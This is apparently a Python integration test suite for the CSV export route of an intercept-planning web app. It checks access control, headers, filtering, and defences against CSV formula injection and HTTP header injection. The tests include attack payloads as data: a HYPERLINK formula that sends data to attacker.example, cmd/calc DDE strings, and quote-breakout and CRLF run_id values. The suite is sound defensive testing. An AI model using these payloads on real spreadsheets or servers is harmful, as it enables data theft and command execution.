"""Integration tests for the intercept CSV export route.

This is a data-egress path: it authenticates, reads per-operator session state
and streams it to the browser. It must never serve another operator's history,
and it must remain importable without reshaping.
"""

from __future__ import annotations

import csv
import io

from tests.integration.conftest import session_state

# Every delta-v column carries its unit in the name. A header reading km/s over
# a value in m/s is worse than either unit alone, because whoever opens the file
# cannot tell which one they have.
_EXPECTED_COLUMNS = [
    "run_id", "method", "red_name", "blue_name", "total_dv_m_s", "arrival_utc",
    "miss_km", "n_burns", "burn_num", "segment", "burn_epoch_utc", "burn_dv_m_s",
    "dv_prograde_m_s", "dv_normal_m_s", "dv_radial_m_s", "notes",
]


def _rows(body: str) -> list[list[str]]:
    return list(csv.reader(io.StringIO(body)))


class TestExportAccessControl:
    def test_requires_authentication(self, initialized_app: object) -> None:
        from fastapi.testclient import TestClient

        with TestClient(initialized_app, raise_server_exceptions=True) as fresh:  # type: ignore[arg-type]
            resp = fresh.get("/plan/export", follow_redirects=False)
            assert resp.status_code == 302
            assert "/login" in resp.headers["location"]


class TestExportShape:
    def test_returns_csv_with_download_headers(self, client: object, auth_cookie: str) -> None:
        resp = client.get(  # type: ignore[attr-defined]
            "/plan/export", cookies={"spectre_session": auth_cookie}
        )
        assert resp.status_code == 200
        assert resp.headers["content-type"].startswith("text/csv")
        assert "attachment" in resp.headers["content-disposition"]
        assert ".csv" in resp.headers["content-disposition"]

    def test_is_not_cached(self, client: object, auth_cookie: str) -> None:
        """Operational history must not linger in an intermediary cache."""
        resp = client.get(  # type: ignore[attr-defined]
            "/plan/export", cookies={"spectre_session": auth_cookie}
        )
        assert resp.headers["cache-control"] == "no-store"

    def test_emits_the_documented_column_header(self, client: object, auth_cookie: str) -> None:
        resp = client.get(  # type: ignore[attr-defined]
            "/plan/export", cookies={"spectre_session": auth_cookie}
        )
        rows = _rows(resp.text)
        assert _EXPECTED_COLUMNS in rows, "the column header must be present and unchanged"

    def test_metadata_header_names_the_operator(self, client: object, auth_cookie: str) -> None:
        resp = client.get(  # type: ignore[attr-defined]
            "/plan/export", cookies={"spectre_session": auth_cookie}
        )
        assert "# SPECTRE Intercept Export" in resp.text
        assert "testadmin" in resp.text

    def test_empty_history_still_returns_a_valid_file(
        self, client: object, auth_cookie: str
    ) -> None:
        """A fresh session exports headers, not an error."""
        resp = client.get(  # type: ignore[attr-defined]
            "/plan/export", cookies={"spectre_session": auth_cookie}
        )
        assert resp.status_code == 200
        assert _EXPECTED_COLUMNS in _rows(resp.text)


class TestExportFiltering:
    def test_run_id_filter_is_reflected_in_the_metadata(
        self, client: object, auth_cookie: str
    ) -> None:
        resp = client.get(  # type: ignore[attr-defined]
            "/plan/export",
            params={"run_id": "RUN_DOES_NOT_EXIST"},
            cookies={"spectre_session": auth_cookie},
        )
        assert resp.status_code == 200
        assert "RUN_DOES_NOT_EXIST" in resp.text

    def test_run_id_filter_appears_in_the_filename(
        self, client: object, auth_cookie: str
    ) -> None:
        resp = client.get(  # type: ignore[attr-defined]
            "/plan/export",
            params={"run_id": "RUN_ABC123"},
            cookies={"spectre_session": auth_cookie},
        )
        assert "RUN_ABC123" in resp.headers["content-disposition"]

    def test_unknown_run_id_yields_no_data_rows(
        self, client: object, auth_cookie: str
    ) -> None:
        resp = client.get(  # type: ignore[attr-defined]
            "/plan/export",
            params={"run_id": "RUN_DOES_NOT_EXIST"},
            cookies={"spectre_session": auth_cookie},
        )
        rows = [r for r in _rows(resp.text) if r and not r[0].startswith("#")]
        # Only the column header row survives.
        assert rows == [_EXPECTED_COLUMNS]


class TestExportIsNotAFormulaCarrier:
    """CSV injection: the file is inert, the spreadsheet that opens it is not.

    Nothing in SPECTRE evaluates this export. Excel, LibreOffice Calc and
    Google Sheets all evaluate a cell whose text begins with ``=``, ``+``,
    ``-`` or ``@``, so a satellite name carrying a formula executes in the
    analyst's spreadsheet the moment they open the download. The name reaches
    this file from UDL and from the operator's own manual entry, so the
    character class is reachable rather than theoretical.

    These are behavioural: they push a formula-shaped name through the real
    route and read the bytes that come back. Deleting ``_csv_safe`` turns the
    first one red.
    """

    @staticmethod
    def _seed(cookie: str, name: str, notes: str = "") -> str:
        """Put one result carrying *name* into the test operator's history."""
        from datetime import UTC, datetime

        from spectre.domain.models import BurnResult, InterceptMethod, InterceptResult

        state = session_state(cookie)
        epoch = datetime(2026, 1, 1, tzinfo=UTC)
        state.intercept_history.append(
            InterceptResult(
                red_name=name,
                blue_name="BLUE-1",
                method=InterceptMethod.LAMBERT,
                burns=[
                    BurnResult(
                        burn_number=1,
                        segment_name="transfer",
                        burn_epoch=epoch,
                        delta_v_m_s=12.5,
                        dv_prograde=-4.25,
                        dv_normal=0.0,
                        dv_radial=-1.5,
                    ),
                ],
                total_delta_v_m_s=12.5,
                arrival_epoch=epoch,
                intercept_range_km=3.2,
                notes=notes,
                option_id="INT_FORMULATEST",
            ),
        )
        return "INT_FORMULATEST"

    @staticmethod
    def _clear(cookie: str) -> None:

        session_state(cookie).intercept_history.clear()

    def test_a_formula_shaped_name_is_written_as_text(
        self, client: object, auth_cookie: str
    ) -> None:
        payload = '=HYPERLINK("http://attacker.example/"&A1,"open me")'
        run_id = self._seed(auth_cookie, payload)
        try:
            resp = client.get(  # type: ignore[attr-defined]
                "/plan/export",
                params={"run_id": run_id},
                cookies={"spectre_session": auth_cookie},
            )
            assert resp.status_code == 200
            rows = [r for r in _rows(resp.text) if r and r[0] == run_id]
            assert rows, "the seeded run never reached the file, so nothing was tested"
            red = rows[0][_EXPECTED_COLUMNS.index("red_name")]
            assert not red.startswith("="), "the name is still a live formula"
            assert red == "'" + payload, "the name must survive intact, quoted"
        finally:
            self._clear(auth_cookie)

    def test_every_formula_lead_is_covered(self, client: object, auth_cookie: str) -> None:
        """``+``, ``-`` and ``@`` are formula leads too, not just ``=``."""
        for lead in ("+", "-", "@"):
            payload = f"{lead}cmd|' /C calc'!A0"
            run_id = self._seed(auth_cookie, payload)
            try:
                resp = client.get(  # type: ignore[attr-defined]
                    "/plan/export",
                    params={"run_id": run_id},
                    cookies={"spectre_session": auth_cookie},
                )
                rows = [r for r in _rows(resp.text) if r and r[0] == run_id]
                assert rows, f"the {lead} run never reached the file"
                red = rows[0][_EXPECTED_COLUMNS.index("red_name")]
                assert red.startswith("'"), f"a leading {lead} was left live"
            finally:
                self._clear(auth_cookie)

    def test_a_negative_delta_v_is_left_alone(self, client: object, auth_cookie: str) -> None:
        """The escape must not quote the numeric columns.

        ``-4.250`` starts with a formula lead and is a number, not a formula.
        A blanket escape would quote every retrograde burn in the file and
        break the 'importable into pandas without reshaping' contract, so the
        numeric exemption is load-bearing and this holds it there.
        """
        run_id = self._seed(auth_cookie, "RED-1")
        try:
            resp = client.get(  # type: ignore[attr-defined]
                "/plan/export",
                params={"run_id": run_id},
                cookies={"spectre_session": auth_cookie},
            )
            rows = [r for r in _rows(resp.text) if r and r[0] == run_id]
            assert rows, "the seeded run never reached the file"
            prograde = rows[0][_EXPECTED_COLUMNS.index("dv_prograde_m_s")]
            assert prograde == "-4.250", f"a negative delta-v was mangled: {prograde!r}"
        finally:
            self._clear(auth_cookie)


class TestNoRowBypassesTheEscape:
    """The escape only holds while every row actually goes through it.

    ``_csv_safe`` is one call away from being bypassed: an export added later
    reaches for ``writer.writerow`` because that is what csv.writer offers, and
    the new column is live again with every existing test still green. So the
    rule is enforced here rather than remembered, by reading the route module's
    own syntax tree.

    The route module is application code, so it is present in every tree the
    suite runs in, including the platform's own checkout.
    """

    @staticmethod
    def _tree() -> object:
        import ast
        import pathlib

        import spectre.web.routes.plan as plan_module

        source = pathlib.Path(plan_module.__file__).read_text(encoding="utf-8")
        return ast.parse(source)

    def test_writerow_is_called_exactly_once_in_the_module(self) -> None:
        import ast

        calls = [
            node
            for node in ast.walk(self._tree())  # type: ignore[arg-type]
            if isinstance(node, ast.Call)
            and isinstance(node.func, ast.Attribute)
            and node.func.attr == "writerow"
        ]
        assert len(calls) == 1, (
            "every row must go through _write_row; found "
            f"{len(calls)} direct writerow calls at lines "
            f"{[c.lineno for c in calls]}"
        )

    def test_the_one_call_lives_inside_the_wrapper(self) -> None:
        import ast

        tree = self._tree()
        wrapper = next(
            (
                node
                for node in ast.walk(tree)  # type: ignore[arg-type]
                if isinstance(node, ast.FunctionDef) and node.name == "_write_row"
            ),
            None,
        )
        assert wrapper is not None, "_write_row has been renamed or removed"
        inside = [
            node
            for node in ast.walk(wrapper)
            if isinstance(node, ast.Call)
            and isinstance(node.func, ast.Attribute)
            and node.func.attr == "writerow"
        ]
        assert len(inside) == 1, "the surviving writerow call is not the wrapper's own"


class TestRunIdCannotReachTheResponseHeader:
    """Response-header injection, CWE-113, through the download filename.

    ``run_id`` is an operator-supplied query value that lands inside the quoted
    ``filename`` of Content-Disposition. RFC 6266 offers no escaping inside that
    quoted string, so ``x"; name="evil`` closes the quote and appends a header
    parameter the caller names, and a CR or an LF ends the header outright. The
    CRLF form reached uvicorn's own validator rather than any check of ours, so
    what the application produced was an unhandled exception. The route is a GET
    and the session cookie is SameSite=lax, so a link in an email fires it
    inside an authenticated operator's session with no CSRF token in play.

    These are behavioural: each payload goes through the real route and the
    assertions read the headers that come back. Deleting the ``_RUN_ID_PATTERN``
    check in ``spectre/web/routes/plan.py`` turns
    ``test_the_quote_breakout_payload_is_refused`` red.
    """

    # Exactly what the security gate drove through the header.
    _BREAKOUT = 'x"; name="evil'

    def test_the_quote_breakout_payload_is_refused(
        self, client: object, auth_cookie: str
    ) -> None:
        resp = client.get(  # type: ignore[attr-defined]
            "/plan/export",
            params={"run_id": self._BREAKOUT},
            cookies={"spectre_session": auth_cookie},
        )
        assert resp.status_code == 400, "a quote-breakout run_id must be refused, not served"
        disposition = resp.headers.get("content-disposition", "")
        assert "evil" not in disposition, f"the payload reached the header: {disposition!r}"
        assert "name=" not in disposition, f"a second header parameter was emitted: {disposition!r}"

    def test_a_crlf_payload_is_refused(self, client: object, auth_cookie: str) -> None:
        """The CRLF variant must be a handled 400, not uvicorn's RuntimeError."""
        resp = client.get(  # type: ignore[attr-defined]
            "/plan/export",
            params={"run_id": "x\r\nX-Injected: yes"},
            cookies={"spectre_session": auth_cookie},
        )
        assert resp.status_code == 400
        assert "x-injected" not in {name.lower() for name in resp.headers}
        assert "X-Injected" not in resp.headers.get("content-disposition", "")

    def test_an_over_long_run_id_is_refused(self, client: object, auth_cookie: str) -> None:
        """The length bound is part of the control, not decoration.

        A 4 KB run_id made only of allowed characters carries no injection by
        itself, but it is still reflected into a header and a filename, so the
        bound is what stops the header growing without limit.
        """
        resp = client.get(  # type: ignore[attr-defined]
            "/plan/export",
            params={"run_id": "A" * 65},
            cookies={"spectre_session": auth_cookie},
        )
        assert resp.status_code == 400

    def test_a_legitimate_option_id_still_exports_end_to_end(
        self, client: object, auth_cookie: str
    ) -> None:
        """The fix must not be 'reject everything'.

        ``INT_`` plus ten uppercase hex characters is exactly what
        ``InterceptResult.option_id`` mints, so this is the identifier a real
        operator follows out of the results table. It has to filter the file and
        still name the download.
        """
        from datetime import UTC, datetime

        from spectre.domain.models import InterceptMethod, InterceptResult

        run_id = "INT_9F3C1A77B2"
        state = session_state(auth_cookie)
        epoch = datetime(2026, 1, 1, tzinfo=UTC)
        state.intercept_history.append(
            InterceptResult(
                red_name="RED-1",
                blue_name="BLUE-1",
                method=InterceptMethod.LAMBERT,
                burns=[],
                total_delta_v_m_s=0.0,
                arrival_epoch=epoch,
                intercept_range_km=1.0,
                notes="",
                option_id=run_id,
            ),
        )
        try:
            resp = client.get(  # type: ignore[attr-defined]
                "/plan/export",
                params={"run_id": run_id},
                cookies={"spectre_session": auth_cookie},
            )
            assert resp.status_code == 200, "a legitimate option_id was refused"
            disposition = resp.headers["content-disposition"]
            assert run_id in disposition, f"the run_id left the filename: {disposition!r}"
            assert disposition.startswith('attachment; filename="')
            assert disposition.endswith('.csv"')
            rows = [r for r in _rows(resp.text) if r and r[0] == run_id]
            assert rows, "the filter dropped the run it was given"
        finally:
            state.intercept_history.clear()

    def test_the_filename_builder_neutralises_a_breakout_on_its_own(self) -> None:
        """The second barrier is pinned directly, because the first one hides it.

        ``_RUN_ID_PATTERN`` refuses the payload long before the filename is
        built, so no request arriving over HTTP can reach this helper with a
        hostile value and prove it does its job. It exists so that a later
        widening of the pattern cannot reopen CWE-113 in silence, and that is
        only true while something holds it in place.
        """
        from spectre.web.routes.plan import _attachment_disposition

        built = _attachment_disposition('spectre_x"; name="evil_20261023.csv')
        assert built.count('"') == 2, f"the filename broke out of its quotes: {built!r}"
        assert ";" not in built[built.index('"'):], f"a second header parameter survived: {built!r}"

        wrapped = _attachment_disposition("spectre_x\r\nX-Injected: yes.csv")
        assert "\r" not in wrapped and "\n" not in wrapped, f"the header was split: {wrapped!r}"
